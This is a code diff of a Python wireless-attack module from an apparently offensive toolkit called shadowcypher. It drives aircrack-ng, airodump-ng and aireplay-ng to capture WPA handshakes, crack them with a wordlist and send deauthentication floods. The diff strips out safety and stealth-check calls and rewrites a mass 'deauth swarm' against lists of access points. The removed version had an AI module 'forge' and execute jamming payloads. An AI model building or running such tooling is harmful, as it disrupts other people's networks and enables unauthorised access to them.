@@ -1,22 +1,12 @@
 """
-Wireless Module — Enterprise Intelligence Build.
+Wireless Module — Apex Intelligence Build.
 Handles Aircrack-ng suite integration, WPA/WPA2 audits, and deauth attacks.
 """
 
-import shutil
-import subprocess  # noqa: F401 — required for test patching via @patch("...wireless.subprocess.*")
-
+import subprocess
 from shadowcypher.core.module import BaseModule
-from shadowcypher.core.platform import platform_engine
 from shadowcypher.core.sanitize import validate_interface
-from shadowcypher.core.stealth import require_stealth
-
-
-def _require_tool(name: str) -> str:
-    path = shutil.which(name)
-    if path is None:
-        raise FileNotFoundError(f"Required tool '{name}' not found in PATH.")
-    return path
+from shadowcypher.core.platform import platform_engine
 
 
 class Wireless(BaseModule):
@@ -83,7 +73,7 @@ class Wireless(BaseModule):
         if not Wireless._check_iface(interface):
             return
         from shadowcypher.core.runner import runner
-        cap_file = f"/tmp/shadowcypher_cap_{bssid.replace(':', '')}"  # nosec B108
+        cap_file = f"/tmp/shadowcypher_cap_{bssid.replace(':', '')}"
         args = [
             "timeout", str(timeout),
             "airodump-ng",
@@ -99,7 +89,6 @@ class Wireless(BaseModule):
     @staticmethod
     def deauth(interface, bssid, client_mac=None, count=10, on_output=None, on_complete=None):
         """Send deauthentication frames to disconnect clients from an AP."""
-        require_stealth(on_output=on_output)
         if not Wireless._check_iface(interface):
             return
         from shadowcypher.core.runner import runner
@@ -115,7 +104,6 @@ class Wireless(BaseModule):
     @staticmethod
     def crack_wpa(cap_file, wordlist=None, on_output=None, on_complete=None):
         """Crack a WPA handshake capture file."""
-        require_stealth(on_output=on_output)
         from shadowcypher.core.runner import runner
         wordlist = wordlist or "/usr/share/wordlists/rockyou.txt"
         args = ["aircrack-ng", "-w", wordlist, cap_file]
@@ -130,12 +118,21 @@ class Wireless(BaseModule):
             "to force clients to our honeypot."
         )
 
-    def deauth_swarm(self, bssid_list, on_output=None):
-        """2026 Signal Suppression: AI-driven coordinated jamming across multiple targets."""
-        from shadowcypher.modules.deephat import deephat
-        if on_output:
-            on_output(f"[SIGNAL] deauth swarm on {len(bssid_list)} targets...\n")
+    def deauth_swarm(self, bssid_list, iface="wlan0mon", on_output=None):
+        """Coordinated deauth across multiple targets using aireplay-ng."""
+        import shutil, threading
+        if not shutil.which("aireplay-ng"):
+            if on_output: on_output("[WARN] aireplay-ng not found — install aircrack-ng suite.\n")
+            return
+        from shadowcypher.core.runner import runner
+        if on_output: on_output(f"[SIGNAL] SWARM_DEAUTH: {len(bssid_list)} targets on {iface}\n")
 
-        desc = f"Generate a coordinated deauth/jamming payload for the following BSSIDs: {', '.join(bssid_list)}. Use opportunistic signal-overlapping for max efficiency."
-        filename = deephat.forge_weapon(desc, category="jamming")
-        return deephat.execute_payload(filename, on_output=on_output)
+        def _run_all():
+            for bssid in bssid_list:
+                if on_output: on_output(f"[DEAUTH] → {bssid}\n")
+                runner.execute_task(
+                    f"DEAUTH_{bssid}",
+                    ["aireplay-ng", "--deauth", "20", "-a", bssid, iface],
+                    callback=on_output,
+                )
+        threading.Thread(target=_run_all, daemon=True).start()
